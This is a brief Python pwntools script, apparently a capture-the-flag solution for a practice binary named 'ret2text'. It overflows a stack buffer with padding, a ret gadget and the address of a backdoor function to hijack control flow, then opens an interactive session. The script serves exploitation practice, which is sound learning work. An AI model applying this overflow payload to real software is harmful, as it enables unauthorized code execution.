from pwn import *
context.log_level="debug"
p = process("./ret2text")
backdoor = 0x000000000040121B
ret = 0x000000000040101a
p.recvuntil(b"Can u ret2text?\n")
payload = b'A' * 0x48 + p64(ret) + p64(backdoor)
p.sendline(payload)
p.interactive()
